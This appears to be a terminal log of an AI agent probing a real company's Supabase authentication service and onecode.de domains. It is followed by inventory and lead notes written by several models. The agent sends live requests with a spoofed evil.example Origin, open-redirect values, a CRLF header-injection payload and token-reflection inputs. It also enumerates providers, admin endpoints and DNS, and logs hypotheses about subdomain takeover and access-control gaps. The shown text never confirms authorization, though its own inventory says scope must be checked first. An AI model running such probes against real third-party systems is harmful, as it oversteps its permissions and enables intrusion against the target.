+  curl -sS -o /tmp/opencode/b.txt -D /tmp/opencode/h.txt -m 15 -H "Origin: https://evil.example" "$B/$p"
+  grep -iE "^HTTP/|^access-control-allow-origin" /tmp/opencode/h.txt
+  head -c 700 /tmp/opencode/b.txt; echo; echo
+  sleep 1.1
+done
+=== openid-configuration ===
+HTTP/2 200 
+access-control-allow-origin: https://evil.example
+{"issuer":"https://aygnpacdkgtsfnhgcyjc.supabase.co/auth/v1","authorization_endpoint":"https://aygnpacdkgtsfnhgcyjc.supabase.co/auth/v1/oauth/authorize","token_endpoint":"https://aygnpacdkgtsfnhgcyjc.supabase.co/auth/v1/oauth/token","jwks_uri":"https://aygnpacdkgtsfnhgcyjc.supabase.co/auth/v1/.well-known/jwks.json","userinfo_endpoint":"https://aygnpacdkgtsfnhgcyjc.supabase.co/auth/v1/oauth/userinfo","scopes_supported":["openid","profile","email","phone","offline_access"],"response_types_supported":["code"],"response_modes_supported":["query"],"grant_types_supported":["authorization_code","refresh_token"],"subject_types_supported":["public"],"id_token_signing_alg_values_supported":["RS256","H
+
+=== jwks.json ===
+HTTP/2 200 
+access-control-allow-origin: https://evil.example
+{"keys":[{"alg":"ES256","crv":"P-256","ext":true,"key_ops":["verify"],"kid":"4f59d46f-c3e6-47c7-a717-fabf016650c9","kty":"EC","use":"sig","x":"ZrLwEgtdAPPIxBVWpwejo3GwzUlEywWWXouHumNCWHQ","y":"XUfs7QV9J1EYdszirAWgqJ8L6EU0ud8JPd_1n88v60g"}]}
+[0m
+[0m$ [0mB="https://aygnpacdkgtsfnhgcyjc.supabase.co/auth/v1"
+echo "=== full openid-configuration ==="
+curl -sS -m 15 "$B/.well-known/openid-configuration" | python3 -m json.tool
+sleep 1.1
+echo "=== set-cookie scan on verify ==="
+curl -sS -o /dev/null -D - -m 15 -H "Origin: https://evil.example" "$B/verify?type=signup&token=x" | grep -i "set-cookie" || echo "(no set-cookie)"
+sleep 1.1
+echo "=== GET oauth/token ==="
+curl -sS -o /tmp/opencode/b.txt -D /tmp/opencode/h.txt -m 15 -H "Origin: https://evil.example" "$B/oauth/token"
+grep -iE "^HTTP/|^access-control-allow-origin|^access-control-allow-credentials" /tmp/opencode/h.txt; head -c 200 /tmp/opencode/b.txt; echo
+=== full openid-configuration ===
+{
+    "issuer": "https://aygnpacdkgtsfnhgcyjc.supabase.co/auth/v1",
+    "authorization_endpoint": "https://aygnpacdkgtsfnhgcyjc.supabase.co/auth/v1/oauth/authorize",
+    "token_endpoint": "https://aygnpacdkgtsfnhgcyjc.supabase.co/auth/v1/oauth/token",
+    "jwks_uri": "https://aygnpacdkgtsfnhgcyjc.supabase.co/auth/v1/.well-known/jwks.json",
+    "userinfo_endpoint": "https://aygnpacdkgtsfnhgcyjc.supabase.co/auth/v1/oauth/userinfo",
+    "scopes_supported": [
+        "openid",
+        "profile",
+        "email",
+        "phone",
+        "offline_access"
+    ],
+    "response_types_supported": [
+        "code"
+    ],
+    "response_modes_supported": [
+        "query"
+    ],
+    "grant_types_supported": [
+        "authorization_code",
+        "refresh_token"
+    ],
+    "subject_types_supported": [
+        "public"
+    ],
+    "id_token_signing_alg_values_supported": [
+        "RS256",
+        "HS256",
+        "ES256"
+    ],
+    "token_endpoint_auth_methods_supported": [
+        "client_secret_basic",
+        "client_secret_post",
+        "none"
+    ],
+    "claims_supported": [
+        "sub",
+        "aud",
+        "iss",
+        "exp",
+        "iat",
+        "auth_time",
+        "nonce",
+        "email",
+        "email_verified",
+        "phone_number",
+        "phone_number_verified",
+        "name",
+        "picture",
+        "preferred_username",
+        "updated_at"
+    ],
+    "code_challenge_methods_supported": [
+        "S256",
+        "plain"
+    ]
+}
+=== set-cookie scan on verify ===
+set-cookie: __cf_bm=UG5OXGPiS84QipcBfuYlsWLPGbl5GQeSMNXPZhPTngQ-1791294378.7656379-1.0.1.1-urYP8qzeJ2R1eEhHZqPH.iyuRKsfF71ufGPVfU39LNj8JrHmZ4YGPNonTc5hdR_jFX_Lo9D4fzC5vNEHWq6DbYaOdAW40P9_VfaikbhPkyq.R89huEV7g0gd1wiiGgD_; HttpOnly; SameSite=None; Secure; Path=/; Domain=supabase.co; Expires=Tue, 06 Oct 2026 14:16:18 GMT
+=== GET oauth/token ===
+HTTP/2 404 
+access-control-allow-origin: https://evil.example
+access-control-allow-credentials: true
+{"code":404,"error_code":"feature_disabled","msg":"OAuth server is disabled"}
+[0m
+[0m$ [0mB="https://aygnpacdkgtsfnhgcyjc.supabase.co/auth/v1"
+for p in health logout callback authorize oauth2/authorize token verify/otp admin/users admin/stats; do
+  printf "%-24s " "$p"
+  curl -sS -o /tmp/opencode/b.txt -w "%{http_code}" -m 15 -H "Origin: https://evil.example" "$B/$p" 2>/dev/null
+  printf " | "
+  head -c 120 /tmp/opencode/b.txt | tr -d '\n'
+  echo
+  sleep 1.1
+done
+health                   401 | {"hint":"No `apikey` request header or url param was found.","message":"No API key found in request"}
+logout                   401 | {"hint":"No `apikey` request header or url param was found.","message":"No API key found in request"}
+callback                 303 | <a href="https://kurs.onecode.de?error=invalid_request&amp;error_code=bad_oauth_callback&amp;error_description=OAuth+sta
+authorize                400 | {"code":400,"error_code":"validation_failed","msg":"Unsupported provider: Provider  could not be found"}
+oauth2/authorize         401 | {"hint":"No `apikey` request header or url param was found.","message":"No API key found in request"}
+token                    401 | {"hint":"No `apikey` request header or url param was found.","message":"No API key found in request"}
+verify/otp               404 | 404 page not found
+admin/users              401 | {"hint":"No `apikey` request header or url param was found.","message":"No API key found in request"}
+admin/stats              401 | {"hint":"No `apikey` request header or url param was found.","message":"No API key found in request"}
+[0m
+[0m$ [0mB="https://aygnpacdkgtsfnhgcyjc.supabase.co/auth/v1"
+run() { echo "=== $1 ==="; shift; curl -sS -o /tmp/opencode/b.txt -D /tmp/opencode/h.txt -m 15 -H "Origin: https://evil.example" "$@"; grep -iE "^HTTP/|^location:|^access-control-allow-origin" /tmp/opencode/h.txt; head -c 250 /tmp/opencode/b.txt | tr -d '\n'; echo; echo; sleep 1.1; }
+run "authorize?provider=github" "$B/authorize?provider=github"
+run "authorize?provider=github&redirect_to=evil" "$B/authorize?provider=github&redirect_to=https://evil.example/cb"
+run "authorize?provider=google&redirect_to=subdomain" "$B/authorize?provider=google&redirect_to=https://evil.kurs.onecode.de/cb"
+run "authorize?provider=google&redirect_to=path" "$B/authorize?provider=google&redirect_to=/attacker-path"
+run "callback garbage" "$B/callback?code=x&state=y"
+=== authorize?provider=github ===
+HTTP/2 400 
+access-control-allow-origin: https://evil.example
+{"code":400,"error_code":"validation_failed","msg":"Unsupported provider: provider is not enabled"}
+
+=== authorize?provider=github&redirect_to=evil ===
+HTTP/2 400 
+access-control-allow-origin: https://evil.example
+{"code":400,"error_code":"validation_failed","msg":"Unsupported provider: provider is not enabled"}
+
+=== authorize?provider=google&redirect_to=subdomain ===
+HTTP/2 400 
+access-control-allow-origin: https://evil.example
+{"code":400,"error_code":"validation_failed","msg":"Unsupported provider: provider is not enabled"}
+
+=== authorize?provider=google&redirect_to=path ===
+HTTP/2 400 
+access-control-allow-origin: https://evil.example
+{"code":400,"error_code":"validation_failed","msg":"Unsupported provider: provider is not enabled"}
+
+=== callback garbage ===
+HTTP/2 303 
+location: https://kurs.onecode.de?error=invalid_request&error_code=bad_oauth_state&error_description=OAuth+state+parameter+is+invalid
+access-control-allow-origin: https://evil.example
+<a href="https://kurs.onecode.de?error=invalid_request&amp;error_code=bad_oauth_state&amp;error_description=OAuth+state+parameter+is+invalid">See Other</a>.{"code":400,"error_code":"bad_oauth_state","msg":"OAuth state parameter is invalid"}
+[0m
+[0m$ [0mB="https://aygnpacdkgtsfnhgcyjc.supabase.co/auth/v1"
+run() { echo "=== $1 ==="; shift; curl -sS -o /tmp/opencode/b.txt -D /tmp/opencode/h.txt -m 15 -H "Origin: https://evil.example" "$@"; grep -iE "^HTTP/|^location:" /tmp/opencode/h.txt; echo; sleep 1.1; }
+run "callback + redirect_to evil" "$B/callback?code=x&state=y&redirect_to=https://evil.example/cb"
+run "callback + redirect_to subdomain" "$B/callback?code=x&state=y&redirect_to=https://x.kurs.onecode.de/cb"
+for p in apple azure discord gitlab keycloak figma notion slack workos kakao twitch facebook line yahoo google github; do
+  printf "%-10s " "$p"
+  curl -sS -o /tmp/opencode/b.txt -w "%{http_code}" -m 15 "$B/authorize?provider=$p" 2>/dev/null
+  printf " "; head -c 90 /tmp/opencode/b.txt | tr -d '\n'; echo
+  sleep 1.1
+done
+=== callback + redirect_to evil ===
+HTTP/2 303 
+location: https://kurs.onecode.de?error=invalid_request&error_code=bad_oauth_state&error_description=OAuth+state+parameter+is+invalid
+
+=== callback + redirect_to subdomain ===
+HTTP/2 303 
+location: https://kurs.onecode.de?error=invalid_request&error_code=bad_oauth_state&error_description=OAuth+state+parameter+is+invalid
+
+apple      400 {"code":400,"error_code":"validation_failed","msg":"Unsupported provider: provider is not 
+azure      400 {"code":400,"error_code":"validation_failed","msg":"Unsupported provider: provider is not 
+discord    400 {"code":400,"error_code":"validation_failed","msg":"Unsupported provider: provider is not 
+gitlab     400 {"code":400,"error_code":"validation_failed","msg":"Unsupported provider: provider is not 
+keycloak   400 {"code":400,"error_code":"validation_failed","msg":"Unsupported provider: provider is not 
+figma      400 {"code":400,"error_code":"validation_failed","msg":"Unsupported provider: provider is not 
+notion     400 {"code":400,"error_code":"validation_failed","msg":"Unsupported provider: provider is not 
+slack      400 {"code":400,"error_code":"validation_failed","msg":"Unsupported provider: provider is not 
+workos     400 {"code":400,"error_code":"validation_failed","msg":"Unsupported provider: provider is not 
+kakao      400 {"code":400,"error_code":"validation_failed","msg":"Unsupported provider: provider is not 
+twitch     400 {"code":400,"error_code":"validation_failed","msg":"Unsupported provider: provider is not 
+facebook   400 {"code":400,"error_code":"validation_failed","msg":"Unsupported provider: provider is not 
+line       400 {"code":400,"error_code":"validation_failed","msg":"Unsupported provider: Provider line co
+yahoo      400 {"code":400,"error_code":"validation_failed","msg":"Unsupported provider: Provider yahoo c
+google     400 {"code":400,"error_code":"validation_failed","msg":"Unsupported provider: provider is not 
+github     400 {"code":400,"error_code":"validation_failed","msg":"Unsupported provider: provider is not
+[0m
+[0m$ [0mB="https://aygnpacdkgtsfnhgcyjc.supabase.co/auth/v1"
+run() { echo "=== $1 ==="; shift; curl -sS -o /tmp/opencode/b.txt -D /tmp/opencode/h.txt -m 15 -H "Origin: https://evil.example" "$@"; grep -iE "^HTTP/|^location:" /tmp/opencode/h.txt; echo "body: $(head -c 200 /tmp/opencode/b.txt | tr -d '\n')"; echo; sleep 1.1; }
+run "token reflection raw" "$B/verify?type=signup&token=REFLECTOR123"
+run "token reflection amp" "$B/verify?type=signup&token=REFLECTOR%26redirect_to%3Dhttps%3A%2F%2Fevil.example"
+run "token CRLF" "$B/verify?type=signup&token=REFLECTOR%0d%0aX-Injected:%20yes"
+run "email param reflection" "$B/verify?type=signup&token=x&email=reflect@evil.example"
+run "token GET on token endpoint w/ publishable key" -H "apikey: sb_publishable_g48Bd8qEtLesgk0zgzTRig_eZ6j9w30" "$B/token?grant_type=pkce&code=x&code_verifier=yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy&redirect_uri=https://kurs.onecode.de"
+=== token reflection raw ===
+HTTP/2 303 
+location: https://kurs.onecode.de#error=access_denied&error_code=otp_expired&error_description=Email+link+is+invalid+or+has+expired&sb=
+body: <a href="https://kurs.onecode.de#error=access_denied&amp;error_code=otp_expired&amp;error_description=Email+link+is+invalid+or+has+expired&amp;sb=">See Other</a>.
+
+=== token reflection amp ===
+HTTP/2 303 
+location: https://kurs.onecode.de#error=access_denied&error_code=otp_expired&error_description=Email+link+is+invalid+or+has+expired&sb=
+body: <a href="https://kurs.onecode.de#error=access_denied&amp;error_code=otp_expired&amp;error_description=Email+link+is+invalid+or+has+expired&amp;sb=">See Other</a>.
+
+=== token CRLF ===
+HTTP/2 303 
+location: https://kurs.onecode.de#error=access_denied&error_code=otp_expired&error_description=Email+link+is+invalid+or+has+expired&sb=
+body: <a href="https://kurs.onecode.de#error=access_denied&amp;error_code=otp_expired&amp;error_description=Email+link+is+invalid+or+has+expired&amp;sb=">See Other</a>.
+
+=== email param reflection ===
+HTTP/2 303 
+location: https://kurs.onecode.de#error=access_denied&error_code=otp_expired&error_description=Email+link+is+invalid+or+has+expired&sb=
+body: <a href="https://kurs.onecode.de#error=access_denied&amp;error_code=otp_expired&amp;error_description=Email+link+is+invalid+or+has+expired&amp;sb=">See Other</a>.
+
+=== token GET on token endpoint w/ publishable key ===
+HTTP/2 405 
+body:
+[0m
+[0m$ [0mB="https://aygnpacdkgtsfnhgcyjc.supabase.co/auth/v1"
+PK="sb_publishable_g48Bd8qEtLesgk0zgzTRig_eZ6j9w30"
+run() { echo "=== $1 ==="; shift; curl -sS -o /tmp/opencode/b.txt -D /tmp/opencode/h.txt -m 15 "$@"; grep -iE "^HTTP/|^location:" /tmp/opencode/h.txt; echo "body: $(head -c 220 /tmp/opencode/b.txt | tr -d '\n')"; echo; sleep 1.1; }
+run "NEG CONTROL random path keyless" "$B/zzz-nonexistent-9931"
+run "admin/users with publishable key" -H "apikey: $PK" "$B/admin/users"
+run "admin/stats with publishable key" -H "apikey: $PK" "$B/admin/stats"
+run "health with publishable key" -H "apikey: $PK" "$B/health"
+run "random path with publishable key" -H "apikey: $PK" "$B/zzz-nonexistent-9931"
+=== NEG CONTROL random path keyless ===
+HTTP/2 401 
+body: {"hint":"No `apikey` request header or url param was found.","message":"No API key found in request"}
+
+=== admin/users with publishable key ===
+HTTP/2 401 
+body: {"code":401,"error_code":"no_authorization","msg":"This endpoint requires a valid Bearer token"}
+
+=== admin/stats with publishable key ===
+HTTP/2 401 
+body: {"code":401,"error_code":"no_authorization","msg":"This endpoint requires a valid Bearer token"}
+
+=== health with publishable key ===
+HTTP/2 200 
+body: {"version":"v2.197.0","name":"GoTrue","description":"GoTrue is a user registration and authentication API"}
+
+=== random path with publishable key ===
+HTTP/2 404 
+body: 404 page not found
+[0m
+[0m$ [0mgrep -nE "^\|" inventory/onecode.md | head -5; echo ---; grep -nE "^## |^# " inventory/onecode.md | head -40; echo ---; sed -n '1,60p' inventory/onecode.md
+20:| Host | Status | Server/Tech |
+21:|---|---|---|
+22:| `kurs.onecode.de` | 307 | Server: railway-hikari -> /login |
+23:| `www.onecode.de` | 200 | Server: cloudflare |
+24:| `mta-sts.onecode.de` | 301 | Server: cloudflare -> https://www.onecode.de/ |
+---
+1:# OneCode GmbH inventory (discovered 2026-09-02)
+14:## PASSIVE RECON 2026-09-02 (read-only, non-intrusive)
+31:## DEEP SERVICE SCAN 2026-09-02 (read-only connect+banner)
+35:## DEEP SERVICE SCAN 2026-09-02 (read-only connect+banner)
+40:## DEEP SERVICE SCAN 2026-09-02 (read-only connect+banner)
+45:## 2026-09-02 21:41:05 UTC
+47:## 2026-09-02 23:34:10 UTC
+49:## 2026-09-03 01:27:20 UTC
+51:## 2026-09-03 06:31:56 UTC
+53:## 2026-09-03 11:43:43 UTC
+55:## 2026-09-03 16:16:20 UTC
+57:## 2026-09-03 19:28:15 UTC
+59:## 2026-09-03 21:54:04 UTC
+62:## 2026-09-04 00:01:14 UTC
+72:## 2026-09-04 03:59:02 UTC
+84:## 2026-09-04 08:47:33 UTC
+88:## 2026-09-04 13:36:00 UTC
+104:## 2026-09-04 17:14:36 UTC
+112:## 2026-09-04 20:01:49 UTC
+114:## 2026-09-04 22:27:30 UTC
+122:## 2026-09-05 00:17:17 UTC
+133:## 2026-09-05 04:43:56 UTC
+144:## 2026-09-05 08:46:23 UTC
+163:## 2026-09-05 12:11:29 UTC
+166:## 2026-09-05 15:42:43 UTC
+176:## 2026-09-05 17:42:22 UTC
+178:## 2026-09-05 19:35:48 UTC
+180:## 2026-09-05 21:48:33 UTC
+182:## 2026-09-05 23:43:03 UTC
+188:## 2026-09-06 03:58:05 UTC
+196:## 2026-09-06 08:40:13 UTC
+204:## 2026-09-06 12:22:06 UTC
+206:## 2026-09-06 15:39:14 UTC
+208:## 2026-09-06 17:44:25 UTC
+210:## 2026-09-06 20:17:37 UTC
+213:## 2026-09-06 22:12:43 UTC
+216:## 2026-09-07 00:05:41 UTC
+218:## 2026-09-07 04:57:10 UTC
+220:## 2026-09-07 10:03:58 UTC
+222:## 2026-09-07 15:58:33 UTC
+---
+# OneCode GmbH inventory (discovered 2026-09-02)
+
+cto.onecode.de
+hostmaster.hostmaster.onecode.de
+hostmaster.hostmaster.www.onecode.de
+hostmaster.onecode.de
+hostmaster.www.onecode.de
+kurs.onecode.de
+mail.onecode.de
+mta-sts.onecode.de
+onecode.de
+www.onecode.de
+
+## PASSIVE RECON 2026-09-02 (read-only, non-intrusive)
+
+> Recon observations only. These are NOT confirmed vulnerabilities; ownership/in-scope of each host must be confirmed against the program scope before any active testing. Hosts resolve + serve HTTP — investigation requires scoped authorization.
+
+**Probed:** 10 hosts | **Live HTTP:** 3
+
+| Host | Status | Server/Tech |
+|---|---|---|
+| `kurs.onecode.de` | 307 | Server: railway-hikari -> /login |
+| `www.onecode.de` | 200 | Server: cloudflare |
+| `mta-sts.onecode.de` | 301 | Server: cloudflare -> https://www.onecode.de/ |
+
+**CNAME review signals (3):**
+- `kurs.onecode.de` -> `tgk4io5m.up.railway.app`
+- `www.onecode.de` -> `cdn.webflow.com`
+- `mta-sts.onecode.de` -> `cdn.webflow.com`
+
+## DEEP SERVICE SCAN 2026-09-02 (read-only connect+banner)
+**Host:** `kurs.onecode.de` | **Ports:** [80, 443]
+**Web surface only:** [80, 443]
+
+## DEEP SERVICE SCAN 2026-09-02 (read-only connect+banner)
+**Host:** `mta-sts.onecode.de` | **Ports:** [80, 443, 2082, 2083, 2086, 2087, 8080, 8443]
+**Non-web ports observed:** [2082, 2083, 2086, 2087, 8080, 8443]
+> NOTE: repeated identical non-web port sets (e.g. 2082,2083,2086,2087,8080,8443) across many hosts and wide port sets are likely a shared edge/proxy answering EOF, NOT confirmed real services. Verify with a proper port scanner (e.g. nmap) under authorization before treating as real. These are surface-map hints only, not findings.
+
+## DEEP SERVICE SCAN 2026-09-02 (read-only connect+banner)
+**Host:** `www.onecode.de` | **Ports:** [80, 443, 2082, 2083, 2086, 2087, 8080, 8443]
+**Non-web ports observed:** [2082, 2083, 2086, 2087, 8080, 8443]
+> NOTE: repeated identical non-web port sets (e.g. 2082,2083,2086,2087,8080,8443) across many hosts and wide port sets are likely a shared edge/proxy answering EOF, NOT confirmed real services. Verify with a proper port scanner (e.g. nmap) under authorization before treating as real. These are surface-map hints only, not findings.
+
+## 2026-09-02 21:41:05 UTC
+
+## 2026-09-02 23:34:10 UTC
+
+## 2026-09-03 01:27:20 UTC
+
+## 2026-09-03 06:31:56 UTC
+
+## 2026-09-03 11:43:43 UTC
+
+## 2026-09-03 16:16:20 UTC
+
+## 2026-09-03 19:28:15 UTC
+
+## 2026-09-03 21:54:04 UTC
+- NEW Probe completed: GET https://kurs.onecode.de/login returns 200 with Next.js login form (email/password), no Set-Cookie header, no visible CSRF token in form. Root /, /api, /graphql, /dashboard all 307
+[0m
+[0m$ [0mgrep -n "www.onecode.de" inventory/onecode.md | tail -15; echo "=== apex ==="; grep -n "^\- .*onecode.de\b" inventory/onecode.md | grep -iE "apex|^\- NEW" | tail -20; echo "=== knowledge tail ==="; grep -n "www.onecode.de\|webflow" knowledge/index.md | tail -15
+5:hostmaster.hostmaster.www.onecode.de
+7:hostmaster.www.onecode.de
+12:www.onecode.de
+23:| `www.onecode.de` | 200 | Server: cloudflare |
+24:| `mta-sts.onecode.de` | 301 | Server: cloudflare -> https://www.onecode.de/ |
+28:- `www.onecode.de` -> `cdn.webflow.com`
+41:**Host:** `www.onecode.de` | **Ports:** [80, 443, 2082, 2083, 2086, 2087, 8080, 8443]
+185:- NEW www.onecode.de verified static Webflow marketing (project onecodedev, pageId 69c2...7b4, cf-cache HIT) — no dynamic/web-crawlable surface; mta-sts.onecode.de = CF 301 mail stub (out-of-scope class).
+191:- NEW www.onecode.de verified static Webflow marketing (project onecodedev, pageId 69c2...7b4, cf-cache HIT) — no dynamic surface; mta-sts.onecode.de = CF 301 mail stub (out-of-scope class)
+=== apex ===
+=== knowledge tail ===
+77:- 2026-09-05 REJECTED MISCONFIG @ www.onecode.de: static Webflow marketing, CF-cached HIT, no dynamic surface — no delta from runs 09-02..09-05.
+92:- 2026-09-06 REJECTED MISCONFIG @ www.onecode.de: static Webflow marketing, CF-cached HIT, no dynamic surface — no delta from runs 09-02..09-05
+100:- 2026-09-06 REJECTED MISCONFIG @ www.onecode.de: Static Webflow marketing, no dynamic surface.
+127:- 2026-09-07 REJECTED MISCONFIG @ www.onecode.de: Static Webflow marketing, no dynamic surface.
+138:- 2026-09-07 REJECTED MISCONFIG @ www.onecode.de: Static Webflow marketing, no dynamic surface
+162:- 2026-09-08 REJECTED MISCONFIG @ www.onecode.de: Static Webflow marketing, no dynamic surface
+181:- 2026-09-08 REJECTED MISCONFIG @ www.onecode.de: Static Webflow marketing, no dynamic surface.
+200:- 2026-09-09 REJECTED MISCONFIG @ www.onecode.de: Static Webflow marketing, no dynamic surface
+[0m
+[0m$ [0mfor h in zzzrandom9931 onecode.de; do printf "%-24s " "$h"; dig +short "$h" | tr '\n' ' '; echo; done
+echo "=== random subdomain ==="; dig +short "no-such-7f3a9c.onecode.de" | tr '\n' ' '; echo
+echo "=== kurs subdomain ==="; dig +short "xyz777.kurs.onecode.de" | tr '\n' ' '; echo
+echo "=== NS/TXT apex ==="; dig +short NS onecode.de; dig +short TXT onecode.de
+zzzrandom9931            
+onecode.de               198.202.211.1 
+=== random subdomain ===
+
+=== kurs subdomain ===
+
+=== NS/TXT apex ===
+ns43.domaincontrol.com.
+ns44.domaincontrol.com.
+"google-site-verification=0nJ9-XTorwTZW8ohamB9UQo5Ovjppo-wX9O0JfOI804"
+"v=spf1 include:_spf.google.com ~all"
+"google-site-verification=II5TDEHAedUSBJkFLiP_Mf5vDjV9MM9CqZbV3G_IbME"
+[0m
+[0m$ [0mB="https://aygnpacdkgtsfnhgcyjc.supabase.co/auth/v1"
+PK="sb_publishable_g48Bd8qEtLesgk0zgzTRig_eZ6j9w30"
+run() { echo "=== $1 ==="; shift; curl -sS -o /tmp/opencode/b.txt -D /tmp/opencode/h.txt -m 15 -H "Origin: https://evil.example" -H "apikey: $PK" "$@"; grep -iE "^HTTP/|^location:" /tmp/opencode/h.txt; echo "body: $(head -c 220 /tmp/opencode/b.txt | tr -d '\n')"; echo; sleep 1.1; }
+run "logout redirect_to evil" "$B/logout?redirect_to=https://evil.example/cb"
+run "logout redirect_to subdomain" "$B/logout?redirect_to=https://evil.kurs.onecode.de/cb"
+run "logout redirect_to path" "$B/logout?redirect_to=/attacker"
+run "logout no redirect" "$B/logout"
+for p in bitbucket spotify zoom saml email; do
+  printf "%-10s " "$p"
+  curl -sS -o /tmp/opencode/b.txt -w "%{http_code}" -m 15 "$B/authorize?provider=$p" 2>/dev/null
+  printf " "; head -c 95 /tmp/opencode/b.txt | tr -d '\n'; echo
+  sleep 1.1
+done
+=== logout redirect_to evil ===
+HTTP/2 405 
+body: 
+
+=== logout redirect_to subdomain ===
+HTTP/2 405 
+body: 
+
+=== logout redirect_to path ===
+HTTP/2 405 
+body: 
+
+=== logout no redirect ===
+HTTP/2 405 
+body: 
+
+bitbucket  400 {"code":400,"error_code":"validation_failed","msg":"Unsupported provider: provider is not enabl
+spotify    400 {"code":400,"error_code":"validation_failed","msg":"Unsupported provider: provider is not enabl
+zoom       400 {"code":400,"error_code":"validation_failed","msg":"Unsupported provider: provider is not enabl
+saml       400 {"code":400,"error_code":"validation_failed","msg":"Unsupported provider: Provider saml could n
+email      400 {"code":400,"error_code":"validation_failed","msg":"Unsupported provider: Provider email could
+[0m
+[0m→ [0mRead probe-results.md
+[0m
+[0m$ [0mtail -c 6000 leads/lead-bigpickle.md; echo "======NEMOTRON TAIL======"; tail -c 4000 leads/lead-nemotron3.md
+.
+testability: PASSIVE
+[HYP] Route-registration-ordered CORS/auth gate on GoTrue
+class: MISCONFIG
+asset: aygnpacdkgtsfnhgcyjc.supabase.co/auth/v1
+confidence: 69
+reasoning: Three-tier behavior: (A) registered well-known + OAuth-router paths reflect Origin with ACAC:true without apikey; (B) /auth/v1/* resource paths reflect with ACAC:true only when apikey present, else ACAO:* no ACAC; (C) fallthrough/unregistered return ACAO:* no ACAC. Pre-gate set is exactly 7 (6 prefix-mounted Kong routes + exactly-matched /verify). Preflight never reflects; reflection is simple-request-only via header/query apikey.
+evidence_needed: eighth pre-gate route, or counter-example breaking the tier boundary.
+verify_steps:
+impact: LOW-MEDIUM — credentialed reflection on identity service with no auth cookie on origin (Bearer-only); policy surface durable across future route additions.
+testability: PASSIVE
+[HYP] Storage pre-auth bucket-existence oracle (bounded)
+class: MISCONFIG
+asset: aygnpacdkgtsfnhgcyjc.supabase.co/storage/v1
+confidence: 62
+reasoning: Route-table-complete across 10 mounted GET classes returning byte-identical 400 {"code":"NoSuchBucket"}; S3 plane under /storage/v1/s3 enforces SigV4 and yields no oracle; credentialed reflection does not extend to storage (ACAO:* no ACAC on all classes). Bucket name absent from all 13 pre-auth bundles; 81 candidate names excluded.
+evidence_needed: single mounted class returning non-NoSuchBucket/InvalidRequest/signature-error for non-existent bucket, or a real bucket name from artifacts.
+verify_steps:
+impact: LOW — existence oracle only, no object data path demonstrated pre-auth, name unrecoverable from pre-auth artifacts.
+testability: PASSIVE
+[FINAL] Pre-auth token-state oracle on GoTrue verify endpoint — conf 71 >=40, PASSIVE, verify_steps present; open-redirect branch closed by measurement, impact LOW, no customer data exposure claimed.
+[FINAL] Route-registration-ordered CORS/auth gate on GoTrue — conf 69, PASSIVE, bounded with counter-example; impact LOW-MEDIUM, cookie-less origin caps ceiling.
+[FINAL] Storage pre-auth bucket-existence oracle (bounded) — conf 62, PASSIVE, route-table-complete with negative controls; impact LOW.
+[PARKED] Post-auth BOLA via Supabase RLS gap (conf 65): requires two invited test accounts (AUTH_HELPED) and cannot be resolved by passive probes; highest-value lead remains gated.
+[PARKED] cto.onecode.de takeover (conf 58): CNAME→cname.perspective-dns.com stable day-58+, HTTP 409, zero TXT; passive probing converged, only owner claim attempt advances — HUMAN_ONLY.
+[PARKED] Forced-login via HashSessionHandoff on /login (fragment sink): mounted on /login RSC payload but requires valid attacker token pair + victim interaction; open-redirect closed, exploitability negligible pre-auth without credentials — AUTH_HELPED.
+[NEXT] PROBE: enumerate type surface on /auth/v1/verify to test parameter validation separation. Execute read-only GETs with token=x and types {signup,invite,magiclink,recovery,email_change,email,sms,phone_change,double_factor} including Origin header to confirm reflection; expect 303 to Site URL with error_code, no off-origin Location. At most 1 rps.
+[LEARN] ACCEPTED AUTH @ aygnpacdkgtsfnhgcyjc.supabase.co/auth/v1/verify: verify is the 7th pre-gate route (keyless), exactly-matched; open-redirect branch closed by measurement (off-origin redirect_to discarded, Site URL fallback), residual is token-state oracle; reflection is simple-request-only with ACAC:true.
+[LEARN] ACCEPTED MISCONFIG @ aygnpacdkgtsfnhgcyjc.supabase.co/auth/v1: CORS/auth gate is route-registration-ordered (three tiers), not blanket; reflection behavior differs by well-known vs resource paths and by presence of apikey; preflight never reflects.
+[LEARN] ACCEPTED MISCONFIG @ aygnpacdkgtsfnhgcyjc.supabase.co/storage/v1: bucket-existence oracle spans 10 route classes returning byte-identical NoSuchBucket, S3 plane SigV4-enforced (no oracle); route-table-complete, bucket name unrecoverable pre-auth.
+[LEARN] REJECTED MISCONFIG @ aygnpacdkgtsfnhgcyjc.supabase.co/rest/v1: monitor closed 09-17 (27 probes 503↔401), never 200+rows; platform enforces sb_publishable_ format only.
+[LEARN] REJECTED MISCONFIG @ kurs.onecode.de: no deploy since 2026-09-19 11:33Z (main/sink chunks byte-identical day-20+), pre-auth surface frozen at {/login,/passwort-vergessen,/datenschutz,/rechtliches} 200; build-diff event-triggered.
+[LEARN] REJECTED MISCONFIG @ cto.onecode.de: CNAME→cname.perspective-dns.com day-58+, HTTP 409, zero verification TXT; passive probing fully converged, HUMAN_ONLY claim path.
+[RISK] OneCode GmbH: 49 — unchanged. Structural findings on identity/data planes remain bounded by measurement: verify oracle residual (LOW), CORS policy surface (LOW-MEDIUM), storage oracle bounded (LOW). Critical unblocked paths remain AUTH_HELPED (post-auth BOLA conf 65) and HUMAN_ONLY (cto conf 58). No demonstrated exploit path to customer data without credentials or owner action.
+## 2026-10-04 12:39:33 UTC [target] (model bigpickle)
+## 2026-10-04 17:08:44 UTC [target] (model bigpickle)
+## 2026-10-04 20:18:52 UTC [target] (model bigpickle)
+## 2026-10-04 23:18:07 UTC [target] (model bigpickle)
+## 2026-10-05 02:11:05 UTC [target] (model bigpickle)
+## 2026-10-05 09:20:43 UTC [target] (model bigpickle)
+## 2026-10-05 18:40:46 UTC [target] (model bigpickle)
+[HYP] GoTrue credentialed CORS reflection is unconditional on `/verify` and survives both response branches, making it post-routing rather than state-dependent.
+[HYP] Pre-auth verification-type enumeration on `/verify` discloses which OTP channels the project has configured, with the parameter validated before the secret.
+[HYP] Storage bucket-existence oracle via `NoSuchBucket` differential.
+[HYP] Post-auth BOLA/RLS gap on Supabase REST remains the only high-value path.
+[HYP] `cto.onecode.de` subdomain takeover.
+## 2026-10-06 00:20:11 UTC [target] (model bigpickle)
+## 2026-10-06 06:40:42 UTC [target] (model bigpickle)
+======NEMOTRON TAIL======
+s credential-class and rate-limited
+[FINAL] 1. Reflected-origin credentialed CORS on GoTrue gateway (confidence 85, MISCONFIG, PASSIVE) — cross-origin authenticated identity reads, includes unconditional well-known reflection
